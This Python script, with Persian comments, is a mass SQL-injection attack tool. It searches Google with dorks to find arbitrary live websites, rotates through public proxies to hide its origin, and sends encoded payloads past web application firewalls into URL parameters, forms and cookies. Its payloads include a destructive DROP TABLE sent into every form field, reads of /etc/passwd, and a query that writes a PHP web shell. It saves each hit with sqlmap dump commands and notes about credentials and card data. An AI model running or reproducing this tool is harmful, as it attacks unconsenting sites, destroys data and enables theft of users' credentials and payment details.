import requests
from bs4 import BeautifulSoup
from googlesearch import search
import urllib.parse
import time
import random
import threading
from queue import Queue
import re
import json
import base64
import hashlib
import socket
import dns.resolver

# لیست پروکسی‌ها (از منابع عمومی جمع‌آوری شده)
proxy_list = [
    {"http": "http://103.174.102.223:80", "https": "https://103.174.102.223:80"},
    {"http": "http://38.54.71.81:80", "https": "https://38.54.71.81:80"},
    {"http": "http://154.202.121.170:3128", "https": "https://154.202.121.170:3128"},
    {"http": "http://45.87.68.6:5555", "https": "https://45.87.68.6:5555"},
    {"http": "http://45.119.81.186:8080", "https": "https://45.119.81.186:8080"},
    {"http": "http://84.32.222.165:8080", "https": "https://84.32.222.165:8080"},
    {"http": "http://154.202.123.23:3128", "https": "https://154.202.123.23:3128"},
    {"http": "http://154.202.111.165:3128", "https": "https://154.202.111.165:3128"},
    {"http": "http://154.202.120.239:3128", "https": "https://154.202.120.239:3128"},
    {"http": "http://154.202.123.183:3128", "https": "https://154.202.123.183:3128"},
    {"http": "http://154.202.123.167:3128", "https": "https://154.202.123.167:3128"},
    {"http": "http://154.202.121.186:3128", "https": "https://154.202.121.186:3128"},
    {"http": "http://154.202.121.222:3128", "https": "https://154.202.121.222:3128"},
    {"http": "http://154.202.123.215:3128", "https": "https://154.202.123.215:3128"},
    {"http": "http://154.202.111.181:3128", "https": "https://154.202.111.181:3128"},
    {"http": "http://154.202.123.199:3128", "https": "https://154.202.123.199:3128"},
    {"http": "http://154.202.111.197:3128", "https": "https://154.202.111.197:3128"},
    {"http": "http://154.202.121.238:3128", "https": "https://154.202.121.238:3128"},
    {"http": "http://154.202.123.231:3128", "https": "https://154.202.123.231:3128"},
    {"http": "http://154.202.111.213:3128", "https": "https://154.202.111.213:3128"}
]

# تابع برای به‌روزرسانی پروکسی‌ها از منبع آنلاین (ProxyScrape API)
def update_proxies():
    try:
        proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        response = requests.get(proxy_url, timeout=10)
        new_proxies = []
        for line in response.text.splitlines():
            if line:
                new_proxies.append({"http": f"http://{line}", "https": f"https://{line}"})
        global proxy_list
        proxy_list.extend(new_proxies)
        print(f"Updated proxy list with {len(new_proxies)} new proxies")
    except Exception as e:
        print(f"Error updating proxies: {e}")

# تابع برای تست پروکسی‌ها
def test_proxy(proxy):
    try:
        response = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
        if response.status_code == 200:
            return True
    except:
        return False

# فیلتر کردن پروکسی‌های فعال
working_proxies = []
update_proxies()  # به‌روزرسانی پروکسی‌ها
for proxy in proxy_list:
    if test_proxy(proxy):
        working_proxies.append(proxy)
        print(f"Proxy {proxy['http']} is working")
    else:
        print(f"Proxy {proxy['http']} is not working")

if not working_proxies:
    print("No working proxies found. Exiting...")
    exit()

# کش برای ذخیره نتایج جستجو
search_cache = {}

# تنظیم هدرها برای جلوگیری از بلاک شدن
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.google.com/"
}

# لیست دork‌های پیشرفته برای پیدا کردن سایت‌های مستعد SQLi
dorks = [
    'inurl:(login.php) "username" "password" -inurl:(signup)',
    'inurl:(products.php?id=) site:*.org -inurl:(login)',
    'inurl:(category.php?cat=) "products" -inurl:(signup)',
    'inurl:(article.php?id=) "read more" site:*.edu',
    'inurl:(news.php?newsid=) "latest news" -inurl:(login)',
    'inurl:(view.php?id=) "details" "Powered by CMS"',
    'inurl:(index.php?page=) "welcome" "Powered by Simple CMS"',
    'inurl:(profile.php?uid=) "user profile" -inurl:(signup)',
    'inurl:(search.php?q=) "search results" "Powered by Search"',
    'inurl:(gallery.php?album=) "photo gallery" "Powered by Gallery"',
    'inurl:(event.php?eventid=) "event details" -inurl:(login)',
    'inurl:(item.php?itemid=) "product details" site:*.com',
    'inurl:(post.php?postid=) "comments" "Powered by Forum"',
    'inurl:(cart.php?item=) "add to cart" "Powered by Cart"',
    'inurl:(checkout.php?order=) "payment" "Powered by Checkout"',
    'inurl:(details.php?id=) "item details" -inurl:(signup)',
    'inurl:(content.php?contentid=) "content" "Powered by CMS"',
    'inurl:(blog.php?post=) "leave a comment" "Powered by Blog"',
    'inurl:(admin.php?section=) "manage" "Powered by Admin Panel"',
    'inurl:(resources.php?resid=) "resources" -inurl:(login)',
    'inurl:(shop.php?prodid=) "shop" "Powered by Shop"',
    'inurl:(category.php?category=) "categories" site:*.net',
    'inurl:(product.php?productid=) "product" "Powered by Store"',
    'inurl:(list.php?listid=) "list" -inurl:(signup)',
    'inurl:(viewcart.php?cartid=) "cart" "Powered by Cart"',
    'inurl:(wp-admin) "wordpress" site:*.org -inurl:(login)',
    'inurl:(index.php?option=com_) "joomla" -inurl:(signup)',
    'inurl:(node/) "drupal" site:*.edu -inurl:(login)',
    'inurl:(index.php?view=) "view" "Powered by PHP"',
    'inurl:(page.php?pageid=) "page" site:*.gov',
    'inurl:(member.php?memberid=) "member" -inurl:(signup)',
    'inurl:(review.php?reviewid=) "review" "Powered by Review"',
    'inurl:(forum.php?topic=) "reply" "Powered by phpBB"',
    'inurl:(contact.php?name=) "contact us" "Powered by Contact Form"',
    'inurl:(update.php?id=) "update" -inurl:(login)',
    'inurl:(display.php?displayid=) "display" site:*.org',
    'inurl:(show.php?showid=) "show" "Powered by Show"',
    'inurl:(browse.php?browseid=) "browse" -inurl:(signup)',
    'inurl:(filter.php?tag=) "filter" "Powered by Filter"',
    'inurl:(dashboard.php?tab=) "dashboard" "Powered by Dashboard"'
]

# لیست payloadهای SQLi پیشرفته (برای عبور از WAF و تست‌های پیچیده‌تر)
sqli_payloads = [
    {"payload": "' OR '1'='1", "type": "In-Band SQLi"},
    {"payload": "' AND 1=0 UNION SELECT NULL,@@VERSION--", "type": "UNION-Based SQLi"},
    {"payload": "' AND SLEEP(5)--", "type": "Time-Based Blind SQLi"},
    {"payload": "' AND 1=CONVERT(int,@@VERSION)--", "type": "Error-Based SQLi"},
    {"payload": "' OR EXISTS(SELECT * FROM users WHERE id=1)--", "type": "Boolean-Based Blind SQLi"},
    {"payload": "'; DROP TABLE users; --", "type": "Second-Order SQLi"},
    {"payload": "' OR 1=1--", "type": "In-Band SQLi (WAF Bypass)"},
    {"payload": "' AND 1=0 UNION SELECT NULL,version()/*", "type": "UNION-Based SQLi (WAF Bypass)"},
    {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "Time-Based Blind SQLi (WAF Bypass)"},
    {"payload": "' AND 1=CAST((SELECT @@VERSION) AS INT)--", "type": "Error-Based SQLi (WAF Bypass)"},
    {"payload": "' OR EXISTS(SELECT * FROM information_schema.tables)--", "type": "Boolean-Based Blind SQLi (WAF Bypass)"},
    {"payload": "' AND 1=0 UNION SELECT NULL,LOAD_FILE('/etc/passwd')--", "type": "UNION-Based File Access"},
    {"payload": "' AND 1=0 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e--", "type": "Out-of-Band SQLi (File Write)"}
]

# امضاهای WAF برای تشخیص
waf_signatures = {
    "Cloudflare": ["cloudflare", "cf-ray"],
    "ModSecurity": ["mod_security", "403 forbidden"],
    "Incapsula": ["incapsula", "visid_incap"],
    "F5 BIG-IP": ["big-ip", "f5 networks"],
    "Imperva": ["imperva", "secureworks"],
    "Sucuri": ["sucuri", "cloudproxy"]
}

# تابع برای تشخیص WAF
def detect_waf(response):
    try:
        for waf, signatures in waf_signatures.items():
            for signature in signatures:
                if signature.lower() in response.text.lower() or signature.lower() in str(response.headers).lower():
                    return waf
        return None
    except:
        return None

# تابع برای کدگذاری payload برای عبور از WAF
def encode_payload(payload):
    try:
        # کدگذاری‌های مختلف برای عبور از WAF
        encoded_payloads = [
            payload,
            urllib.parse.quote(payload),  # URL Encoding
            base64.b64encode(payload.encode()).decode(),  # Base64 Encoding
            f"/*{payload}*/",  # Comment Obfuscation
            payload.replace(" ", "/**/")  # Space Obfuscation
        ]
        return encoded_payloads
    except:
        return [payload]


def crawl_for_inputs(url, proxy):
    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = []
        

        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        for param in query_params:
            inputs.append(("url", param))


        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', url)
            action = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                    inputs.append(("form", action, method, name))


        cookies = response.cookies.get_dict()
        for cookie_name in cookies:
            inputs.append(("cookie", cookie_name))

        return inputs
    except:
        return []


def test_inband_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "In-Band" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "mysql" in response.text.lower() or "sql server" in response.text.lower() or "oracle" in response.text.lower():
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to retrieve all data from the database (e.g., user credentials, credit card info). For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --dbs. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "mysql" in response.text.lower() or "sql server" in response.text.lower() or "oracle" in response.text.lower():
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to retrieve data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --dbs. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "mysql" in response.text.lower() or "sql server" in response.text.lower() or "oracle" in response.text.lower():
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to retrieve data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --dbs. Server: {server_info}, DB Version: {db_version}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_union_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "UNION-Based" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "@@VERSION" in response.text or "version()" in response.text:
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to extract database version and structure. Then use UNION to dump tables like users (e.g., UNION SELECT NULL,username,password FROM users--). For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --dump. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "@@VERSION" in response.text or "version()" in response.text:
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --dump. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "@@VERSION" in response.text or "version()" in response.text:
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --dump. Server: {server_info}, DB Version: {db_version}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_time_based_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "Time-Based" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            start_time = time.time()
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if end_time - start_time >= 5:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to extract data bit by bit (e.g., AND IF(1=1,SLEEP(5),0)--). For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --technique=T --dump. Server: {server_info}"
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            start_time = time.time()
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=10)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if end_time - start_time >= 5:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --technique=T --dump. Server: {server_info}"
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            start_time = time.time()
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=10)
                            end_time = time.time()
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if end_time - start_time >= 5:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --technique=T --dump. Server: {server_info}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_error_based_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "Error-Based" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "error" in response.text.lower() and ("sql" in response.text.lower() or "convert" in response.text.lower()):
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to extract data through error messages (e.g., AND 1=CONVERT(int,(SELECT @@VERSION))--). For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --technique=E --dump. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "error" in response.text.lower() and ("sql" in response.text.lower() or "convert" in response.text.lower()):
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --technique=E --dump. Server: {server_info}, DB Version: {db_version}"
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if "error" in response.text.lower() and ("sql" in response.text.lower() or "convert" in response.text.lower()):
                                server_info = response.headers.get("Server", "Unknown")
                                db_version = re.search(r"(\d+\.\d+\.\d+)", response.text)
                                db_version = db_version.group(0) if db_version else "Unknown"
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --technique=E --dump. Server: {server_info}, DB Version: {db_version}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_boolean_based_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "Boolean-Based" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            response_normal = requests.get(url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if response.text != response_normal.text:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to extract data using true/false conditions (e.g., OR EXISTS(SELECT * FROM users WHERE username='admin')--). For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --technique=B --dump. Server: {server_info}"
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                            response_normal = requests.get(url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if response.text != response_normal.text:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --technique=B --dump. Server: {server_info}"
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                            response_normal = requests.get(url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            if response.text != response_normal.text:
                                server_info = response.headers.get("Server", "Unknown")
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --technique=B --dump. Server: {server_info}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_second_order_sqli(url, proxy):
    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', url)
            action = urllib.parse.urljoin(url, action)
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            data = {}
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    data[name] = "'; DROP TABLE users; --"
            if method == 'post':
                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
            else:
                query = urllib.parse.urlencode(data)
                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
            check_response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            waf = detect_waf(check_response)
            if waf:
                print(f"WAF Detected: {waf} on {url}")
            if "error" in check_response.text.lower() or "mysql" in check_response.text.lower():
                server_info = check_response.headers.get("Server", "Unknown")
                return True, url, "Second-Order SQLi", f"Exploit: Submit the payload in the form at {url} (e.g., input field). The query will execute later, potentially dropping tables or extracting data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --second-order --dump. Server: {server_info}"
        return False, url, None, None
    except:
        return False, url, None, None


def test_out_of_band_sqli(url, proxy):
    try:
        inputs = crawl_for_inputs(url, proxy)
        unique_id = hashlib.md5(url.encode()).hexdigest()
        oob_domain = f"{unique_id}.burpcollaborator.net"  
        for input_type, *input_data in inputs:
            for payload_info in sqli_payloads:
                if "Out-of-Band" in payload_info["type"]:
                    encoded_payloads = encode_payload(payload_info["payload"])
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            
                            try:
                                dns.resolver.resolve(oob_domain, "A")
                                server_info = response.headers.get("Server", "Unknown")
                                return True, test_url, payload_info["type"], f"Exploit: Use the URL {test_url} to trigger Out-of-Band SQLi. Monitor DNS/HTTP requests at {oob_domain} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{test_url}' --dns-domain {oob_domain} --dump. Server: {server_info}"
                            except:
                                pass
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            try:
                                dns.resolver.resolve(oob_domain, "A")
                                server_info = response.headers.get("Server", "Unknown")
                                return True, action, payload_info["type"], f"Exploit: Submit '{encoded_payload}' in the form at {action} to trigger Out-of-Band SQLi. Monitor DNS/HTTP requests at {oob_domain} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{action}' --data '{name}={encoded_payload}' --dns-domain {oob_domain} --dump. Server: {server_info}"
                            except:
                                pass
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                            waf = detect_waf(response)
                            if waf:
                                print(f"WAF Detected: {waf} on {url}")
                            try:
                                dns.resolver.resolve(oob_domain, "A")
                                server_info = response.headers.get("Server", "Unknown")
                                return True, url, payload_info["type"], f"Exploit: Set the cookie '{cookie_name}' to '{encoded_payload}' to trigger Out-of-Band SQLi. Monitor DNS/HTTP requests at {oob_domain} to extract data. For advanced exploitation, use SQLMap with: sqlmap -u '{url}' --cookie '{cookie_name}={encoded_payload}' --dns-domain {oob_domain} --dump. Server: {server_info}"
                            except:
                                pass
        return False, url, None, None
    except:
        return False, url, None, None


def prioritize_dorks(dorks):
    priority_dorks = []
    for dork in dorks:
        score = 0
        if "id=" in dork or "uid=" in dork or "itemid=" in dork:
            score += 3  
        if "wordpress" in dork or "joomla" in dork or "drupal" in dork:
            score += 2  
        if "site:*.edu" in dork or "site:*.org" in dork:
            score += 1  
        priority_dorks.append((dork, score))
    priority_dorks.sort(key=lambda x: x[1], reverse=True)
    return [dork[0] for dork in priority_dorks]


def worker(queue, results, lock):
    while not queue.empty():
        dork = queue.get()
        proxy = random.choice(working_proxies)
        print(f"Searching with dork: {dork} using proxy {proxy['http']}")
        try:

            cache_key = hashlib.md5(dork.encode()).hexdigest()
            if cache_key in search_cache:
                urls = search_cache[cache_key]
            else:
                urls = list(search(dork, num=5, stop=5, pause=random.uniform(2, 5)))
                search_cache[cache_key] = urls

            for url in urls:
                print(f"Testing: {url}")
                is_vulnerable, vuln_url, sqli_type, exploit = test_inband_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_union_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_time_based_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_error_based_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_boolean_based_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_second_order_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")
                    continue

                is_vulnerable, vuln_url, sqli_type, exploit = test_out_of_band_sqli(url, proxy)
                if is_vulnerable:
                    with lock:
                        results.append((vuln_url, sqli_type, exploit))
                        print(f"Found: {vuln_url} ({sqli_type})")

                with lock:
                    if len(results) >= 100:
                        return
        except Exception as e:
            print(f"Error with dork {dork}: {e}")
            time.sleep(5)


def find_sqli_vulnerabilities():

    prioritized_dorks = prioritize_dorks(dorks)
    queue = Queue()
    for dork in prioritized_dorks:
        queue.put(dork)

    results = []
    lock = threading.Lock()
    threads = []
    num_threads = 10  
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(queue, results, lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return results[:100] 


def save_results(vulnerable_sites):
    with open("sqli_vulnerabilities.txt", "w", encoding="utf-8") as f:
        for site in vulnerable_sites:
            vuln_url, sqli_type, exploit = site
            f.write(f"Vulnerable URL: {vuln_url}\n")
            f.write(f"SQLi Type: {sqli_type}\n")
            f.write(f"{exploit}\n")
            f.write("-" * 50 + "\n")

if __name__ == "__main__":
    print("Starting ultra-advanced SQLi vulnerability search with proxies...")
    vulnerable_sites = find_sqli_vulnerabilities()
    save_results(vulnerable_sites)
    print(f"Found {len(vulnerable_sites)} vulnerable sites. Results saved to sqli_vulnerabilities.txt")